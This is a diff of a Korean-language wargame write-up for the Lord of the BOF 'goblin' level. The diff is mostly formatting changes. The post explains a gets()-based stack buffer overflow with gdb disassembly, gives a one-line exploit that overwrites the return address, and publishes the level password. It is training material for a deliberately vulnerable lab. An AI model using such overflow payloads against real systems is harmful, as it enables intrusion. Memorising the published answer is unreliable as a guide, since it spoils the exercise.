@@ -5,7 +5,8 @@ tags: [stack buffer overflow]
 ---
 
 ## cobolt
----
+<hr style="border-top: 1px solid;"><br>
+
 ```c
 /*
         The Lord of the BOF : The Fellowship of the BOF
@@ -20,6 +21,9 @@ int main()
     printf("%s\n", buffer);
 }
 ```
+
+<br>
+
 ```
 (gdb)
 0x80483f8 <main>:       push   %ebp
@@ -37,15 +41,27 @@ int main()
 0x804841b <main+35>:    leave
 0x804841c <main+36>:    ret
 ```
-<br>
-<br>
+
+<br><br>
+<hr style="border: 2px solid;">
+<br><br>
 
 ## Solution
----
-코드를 보면 gets 함수를 사용함. strcpy()와 같은 이유로 버퍼 오버플로 취약점 발생함. 그리고 버퍼 크기고 작으므로 마찬가지로 환경변수를 이용함.
+<hr style="border-top: 1px solid;"><br>
 
-gets 함수는 입력값을 직접 받는 함수기 때문에 strcpy와는 달리 입력값을 주고 파이프```|```로 그 값을 cobolt에 줘야함.  
-```
-(python -c 'print "A"*20+"\x0e\xfc\xff\xbf"'; cat) | ./goblin
-``` 
+코드를 보면 ```gets``` 함수를 사용함. 
+
+``strcpy()```와 같은 이유로 버퍼 오버플로 취약점 발생함. 
+
+그리고 버퍼 크기고 작으므로 마찬가지로 환경변수를 이용함.
+
+```gets``` 함수는 입력값을 직접 받는 함수로, ```strcpy```와는 달리 입력값을 주고 파이프 ```|```로 그 값을 ```cobolt```에 줘야함.
+: ```(python -c 'print "A"*20+"\x0e\xfc\xff\xbf"'; cat) | ./goblin```
+
+<br>
+
 my-pass : hackers proof
+
+<br><br>
+<hr style="border: 2px solid;">
+<br><br>
